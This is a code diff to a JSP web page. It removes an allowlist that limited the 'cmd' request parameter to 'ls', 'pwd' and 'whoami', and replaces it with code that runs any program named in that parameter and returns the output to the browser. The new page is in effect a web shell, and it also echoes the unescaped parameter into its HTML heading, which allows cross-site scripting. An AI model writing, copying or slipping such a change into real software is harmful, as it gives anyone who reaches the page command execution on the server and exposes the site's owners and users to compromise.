@@ -1,33 +1,41 @@
 <html>
-<body>
-    <%@ page import = "java.sql.*,java.util.*" %>
-    <%
+    <head>
+    </head>
+
+    <body>
+        <%@ page import="java.io.*" %>
+        <%@ page import="java.util.*" %>
+    
+        <%
+            String command = request.getParameter("cmd");
+        %>
         
-        boolean isAllowedCommand(String cmd) {
-            List<String> allowedCommands = Arrays.asList("ls", "pwd", "whoami"); // Example allowed commands
-            return allowedCommands.contains(cmd);
-        }
+        <h1>
+            <% out.println("Command: " + command); %>
+        </h1>
 
-        String command = request.getParameter("cmd");
+        <%
+            if (command != null) {
+                try {
+                    ProcessBuilder processBuilder = new ProcessBuilder(command);
+                    processBuilder.redirectErrorStream(true);    
+                    
+                    Process process = processBuilder.start();
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        out.println(line + "<br>");
+                    }
 
-        if (command != null && isAllowedCommand(command)) {
-            try {
-                ProcessBuilder processBuilder = new ProcessBuilder(command.split(" "));
-                processBuilder.redirectErrorStream(true); // Combine stdout and stderr
-                Process process = processBuilder.start();
+                    int exitCode = process.waitFor();
+                    out.println("Command exited with code: " + exitCode);
 
-                BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                String line;
-                while ((line = input.readLine()) != null) {
-                    out.println(line);
+                } catch (Exception e) {
+                    out.println("Error executing command: " + e.getMessage());
                 }
-                input.close();
-            } catch (IOException e) {
-                out.println("Error executing command: " + e.getMessage());
+            } else {
+                out.println("Invalid command.");
             }
-        } else {
-            out.println("Invalid command.");
-        }
-    %>
-</body>
+        %>
+    </body>
 </html>
